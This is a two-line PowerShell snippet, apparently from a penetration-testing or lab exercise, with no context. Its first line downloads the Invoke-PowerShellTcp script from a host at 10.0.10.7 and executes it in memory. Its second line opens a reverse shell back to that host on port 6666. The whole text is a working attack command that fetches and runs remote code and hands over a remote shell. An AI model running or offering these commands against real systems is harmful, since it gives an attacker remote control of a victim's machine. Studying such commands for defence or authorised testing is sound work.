iex (New-Object Net.Webclient).downloadstring("http://10.0.10.7/Invoke-PowerShellTcp.ps1")
Invoke-PowerShellTcp -Reverse -IPAddress 10.0.10.7 -Port 6666
